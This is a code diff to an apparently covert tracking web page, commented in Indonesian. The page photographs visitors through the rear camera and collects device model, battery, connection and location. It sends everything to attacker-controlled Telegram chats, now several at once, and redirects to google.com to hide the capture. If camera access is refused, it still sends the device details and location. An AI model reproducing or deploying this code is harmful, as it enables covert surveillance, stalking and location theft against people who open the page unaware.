@@ -88,22 +88,35 @@
             const details = await getDeviceDetails();
 
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob);
-                formData.append('caption', `📸 <b>Laporan Kamera Belakang</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`);
-                formData.append('parse_mode', 'HTML');
-                
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                window.location.href = "https://google.com";
-            }, 'image/jpeg');
-        }
+    for (const id of CHAT_ID) {
+        const formData = new FormData();
+        formData.append('chat_id', id); // Kirim satu per satu
+        formData.append('photo', blob);
+        formData.append('caption', `📸 <b>Laporan Kamera Belakang</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`);
+        formData.append('parse_mode', 'HTML');
+        
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    }
+    window.location.href = "https://google.com";
+}, 'image/jpeg');
+            
 
         async function kirimDataTanpaFoto() {
-            const details = await getDeviceDetails();
-            const text = `⚠️ <b>Kamera Belakang Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`;
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
-            window.location.href = "https://google.com";
+    const details = await getDeviceDetails();
+    const text = `⚠️ <b>Kamera Belakang Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`;
+    
+    for (const id of CHAT_ID) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: id,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+    }
+    window.location.href = "https://google.com";
         }
     </script>
 </body>
